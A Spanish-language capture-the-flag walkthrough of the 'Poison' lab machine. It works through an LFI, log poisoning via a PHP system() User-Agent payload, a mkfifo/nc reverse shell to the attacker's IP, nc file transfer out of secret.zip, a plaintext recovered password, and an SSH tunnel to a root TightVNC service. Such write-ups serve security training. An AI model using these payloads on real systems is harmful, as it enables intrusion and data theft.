----
- Tags: #lfi #logpoisoning #tightvnc #vncviewer #tunneling #ssh-tunneling
-----
# Resolución

------
> En esta máquina se abusa de un parámetro "**file**" vulnerable a **LFI** para luego derivarlo a un **Log Poisoning**, de esta forma ganamos acceso a la máquina.
> En la escalada de privilegios se detectó un archivo *secret.zip* que lo analizamos en local, detectando que se emplea la reutilización de contraseña del usuario Charix para desbloquearlo, dentro posee un código ilegible de lo que parece ser una clave.
> Investigando en la máquina se detectó un servicio llamado "**TightVNC**" corriendo por el **puerto 5901** como **root**, este corresponde a un Software que permite controlar y acceder a una computadora a través de una red. Este servicio corre de manera interna por lo que no tendremos acceso desde nuestra máquina de atacante, debido a esto empleamos un **Dynamic Port Forwarding** para redirigir el tráfico del puerto 5901 de la máquina víctima a nuestro puerto 5901 de la máquina atacante. De esta manera utilizamos el archivo *secret* como contraseña para el servicio TightVNC, ganando acceso al usuario root.
----
## Reconocimiento

### OS

**LINUX**
```shell
ping -c 1 10.10.10.84
PING 10.10.10.84 (10.10.10.84) 56(84) bytes of data.
64 bytes from 10.10.10.84: icmp_seq=1 ttl=63 time=246 ms

--- 10.10.10.84 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 246.365/246.365/246.365/0.000 ms
```

### NMAP

**Puertos**
```ruby
# Nmap 7.94SVN scan initiated Thu Dec 12 16:42:05 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN allPorts 10.10.10.84
Nmap scan report for 10.10.10.84
Host is up, received user-set (0.25s latency).
Scanned at 2024-12-12 16:42:05 -03 for 26s
Not shown: 60222 filtered tcp ports (no-response), 5311 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Dec 12 16:42:31 2024 -- 1 IP address (1 host up) scanned in 26.42 seconds
```

**Servicios**
```ruby
# Nmap 7.94SVN scan initiated Thu Dec 12 16:43:23 2024 as: nmap -sCV -p22,80 -oN services 10.10.10.84
Nmap scan report for 10.10.10.84
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 12 16:43:39 2024 -- 1 IP address (1 host up) scanned in 16.08 seconds
```

### Whatweb

```ruby
whatweb http://10.10.10.84
http://10.10.10.84 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.4.29 (FreeBSD) PHP/5.6.32], IP[10.10.10.84], PHP[5.6.32], X-Powered-By[PHP/5.6.32]
```

## Explotación

Se detectó en el servicio web que el parámetro ``file`` es vulnerable a un **LFI**, gracias a esto se pudo observar los **Logs** dentro del archivo **``/var/log/httpd-access.log``** propio de **FreeBSD**. De esta manera realizamos un **Log Poisoning** modificando el ``User-Agent`` colocando un código PHP malicioso para poder conseguir un **RCE**.

Colocamos una ruta que no exista, por ejemplo *``probando.php``*

- **``curl -s -X GET "http://10.10.10.84/probando.php" -H "User-Agent: <?php system($_GET['cmd']); ?>"``**

Ahora si observamos los *logs* y colocamos el parámetro que añadimos con ``system($_GET['cmd'])`` de la siguiente forma, podremos ejecutar comandos.

- ``http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=whoami``

![[P 1.png]]

Si ahora intentamos entablar una Reverse Shell con ``bash -c`` y ``bash -i`` veremos que no será posible ya que el sistema **no posee una bash**, por lo tanto lo vamos a intentar con nc pero no de la forma tradicional, ya que tampoco se podrá.

Nos vamos a apoyar el repositorio de *``Monkey Pentest``* para utilizar el payload que entabla un **Reverse Shell** de una forma rápida con ``nc`` para versiones antiguas.

(Es ==importante== URLencodear los ``&`` en ``%26``)

- ``http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.25 443 >/tmp/f``

De esta forma si nos ponemos en escucha por el *puerto 443* en nuestra máquina de atacante, ganaremos acceso a la máquina víctima.

- ``nc -nlvp 443``

----
## Escalada de Privilegios

### User Pivoting al usuario ``Charix``

Si indagamos en el **directorio actual** en donde nos encontramos una vez ingresamos a la máquina con la Reverse Shell, veremos que hay un archivo llamado **``pwdbackup.txt``** que si observamos su contenido, habrá una contraseña en **base64** que como se indica está codificada más de una vez, por lo tanto realizamos la decodificación.

- **``echo "cadena-en-base64" | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d``**

De esta forma conseguiremos la **contraseña** de lo que parece ser el usuario ``Charix:Charix!2#4%6&8(0`` por lo tanto intentamos conectarnos por *SSH*.

- **``ssh charix@10.10.10.84``**

Luego proporcionamos la contraseña y conseguimos acceso al usuario **``Charix``**.

------
### Escalada al usuario ``root``

Luego de ganar acceso al usuario **``Charix``**, nuestro objetivo es conseguir el usuario **``root``**, por lo tanto comenzamos con el reconocimiento.

Detectamos que en el directorio actual de ``Charix`` hay un archivo llamado **``secret.zip``**, por lo tanto nos lo pasaremos a nuestro máquina de atacante para analizarlo con certeza.

- ``nc -nlvp 443 > secret.zip`` --> Máquina atacante
- ``nc 10.10.14.25 443 < secret.zip``  --> Máquina víctima

De esta forma conseguiremos el archivo ``secret.zip`` en nuestra **máquina de atacante**.

Descubrimos que el archivo posee contraseña y que esta es ``Charix!2#4%6&8(0``, es decir, se **reutilizó la contraseña** del usuario ``Charix`` para el archivo ``secret.zip``. Ahora si observamos el contenido de dicho archivo ya descomprimido, veremos que no posee caracteres legibles ni nada que nos brinde información.

![[P 2.png]]

Intentamos realizar fuerza bruta con *``zip2john``* y *``john``* con el diccionario *``rockyou.txt``* pero no se obtuvo respuesta, por lo tanto podemos intuir que se trata de alguna clave o algo en particular.

----

Indagando en el sistema vemos que con ``ps -faux`` se encuentra un proceso corriendo por el usuario ``root`` llamado **``tightvnc``**.

**TightVNC** ==es un software gratuito y de código abierto que permite controlar y acceder a una computadora a través de una red==. Se trata de un software de escritorio remoto que permite visualizar el escritorio de otra computadora y, si se desea, tomar el control de ella.

Por lo tanto al ver este proceso procederemos a detectar si los puertos más comunes de *``TightVNC``* están abiertos en el sistema.

- ``netstat -na -p tcp``

![[P 3.png]]

Como podemos ver lo están, por lo tanto instalaremos la **utilidad** que permite el uso de **TightVNC**.

- **``apt install xtightvncviewer``**

Ahora si hacemos un ``vncviewer --help`` veremos que hay una forma de **cargar un archivo como contraseña**, por lo tanto nuestro archivo **secret** puede ser una especie de clave que nos permita ganar acceso a la máquina como usuario **root**.

----

Tenemos que tener en cuenta que nosotros no podríamos conectarnos directamente ya que el *puerto 5801* y *5901* no se encuentran expuestos, es decir no los podemos ver de manera externa, por lo tanto para poder abrir una especie de "túnel" que nos permita ejecutar el *``vncviewer``* a través de la máquina víctima debemos realizar un **``Dynamic Port Forwarding``**.

Para realizar esto se puede hacer de varias maneras, en mi caso lo haré con un *túnel SSH* de la siguiente forma. 

- **``ssh -L5901:127.0.0.1:5901 charix@10.10.10.84``**

Una vez hecho esto realizaremos una conexión por **SSH** con las credenciales de ``Charix!2#4%6&8(0`` como lo hicimos previamente, pero esta vez estamos **redirigiendo el tráfico al puerto 5901 LOCAL**. Tenemos que entender que lo que estamos haciendo es **redirigir** el tráfico del *puerto 5901* de la máquina víctima a nuestro *puerto 5901* de nuestra máquina de atacante.

Una vez dentro si en nuestra máquina de atacante hacemos un **``lsof -i:5901``** veremos que el puerto está en uso por la conexión que realizamos por **SSH**. De esta forma ahora si utilizamos el **``vncviewer``** pero a través del túnel conseguiremos acceso a una consola de **TightVNC** como el usuario **root**.

- **``vncviewer 127.0.0.1::5901 -passwd secret``**


![[P 5.png]]

De esta forma ganaríamos acceso a la máquina **``Poison``** como usuario **root**.